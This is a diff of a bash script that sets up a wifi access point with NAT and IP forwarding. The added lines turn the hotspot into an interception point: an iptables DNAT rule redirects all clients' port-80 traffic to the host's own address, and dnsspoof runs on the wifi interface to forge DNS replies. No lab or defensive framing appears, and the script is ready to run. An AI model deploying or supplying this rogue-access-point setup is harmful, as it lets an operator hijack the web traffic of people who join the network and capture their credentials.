@@ -1,5 +1,8 @@
 #!/bin/bash
 
+#By Adrien Chaptal & Enrick Mondongue
+#Description : Enable the wifi access point and configure the routes, Iptables, and net fowarding
+
 #interfaces configuration
 INT_WIFI="wlan0" # wifi access point interface
 INT_NET="eth0" # interface connected to internet
@@ -36,11 +39,13 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo -e "IPTABLES configuration"
 # IP TABLES
-sudo modprobe ipt_MASQUERADE
-sudo iptables -A POSTROUTING -t nat -o $INT_NET -j MASQUERADE
-sudo iptables -A FORWARD --match state --state RELATED,ESTABLISHED --jump ACCEPT
-sudo iptables -A FORWARD -i $INT_WIFI --destination $SUBNET --match state --state NEW --jump ACCEPT
-sudo iptables -A INPUT -s $SUBNET --jump ACCEPT
+sudo iptables --table nat --append POSTROUTING --out-interface $INT_NET -j MASQUERADE 
+sudo iptables --append FORWARD --in-interface $INT_WIFI -j ACCEPT 
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80 
+sudo iptables -t nat -A POSTROUTING -j MASQUERADE 
+
+#dnsspoof
+sudo dnsspoof -i $INT_WIFI 
 
 
 echo -e "[finished! Please don't close the shell ]"
